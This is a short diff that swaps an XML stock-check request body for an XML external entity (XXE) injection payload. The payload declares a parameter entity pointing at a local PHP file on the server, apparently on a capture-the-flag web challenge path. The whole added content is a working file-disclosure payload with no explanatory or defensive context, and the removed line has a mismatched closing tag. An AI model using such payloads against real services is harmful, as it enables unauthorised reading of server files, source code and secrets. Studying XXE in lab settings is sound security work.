@@ -1,3 +1,2 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-
-<stockCheck><productId>1</productId><storeId>1</storedId></stockCheck>
+<!DOCTYPE rss [ <!ENTITY % xxe SYSTEM "file:///challenge/web-serveur/ch29/index.php"> %xxe; ]> 
